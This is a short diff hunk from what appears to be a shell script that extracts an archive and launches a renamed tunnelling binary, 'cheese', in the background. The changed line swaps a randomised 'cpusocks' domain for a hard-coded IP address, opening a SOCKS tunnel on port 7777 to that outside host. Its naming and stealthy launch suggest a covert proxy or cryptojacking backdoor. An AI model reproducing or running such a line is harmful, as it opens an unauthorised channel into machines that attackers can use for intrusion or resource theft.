@@ -30,7 +30,7 @@ tar -xf cheese.tar.gz
 
 sleep 2
 
-./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &
+./cheese client -v 45.135.58.52:80 7777:socks &
 
 sleep 2
 
